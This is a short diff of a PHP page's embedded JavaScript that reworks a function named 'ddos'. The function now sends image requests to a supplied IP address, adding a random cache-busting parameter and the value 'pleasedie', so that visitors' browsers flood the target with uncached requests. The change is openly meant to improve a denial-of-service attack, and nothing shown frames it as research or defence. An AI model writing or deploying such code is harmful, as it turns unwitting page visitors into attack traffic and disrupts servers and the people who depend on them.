@@ -75,8 +75,9 @@ function show_access()
         </div>
         <script>
             const ddos = ip => {
+                const img = new Image()
                 const rand = Math.floor(Math.random() * 1000)
-                $.get(`http://${ip}`)
+                img.src = `http://${ip}/index.php?&${rand}=pleasedie`
             }
         </script>
         <?php show_access() ?>
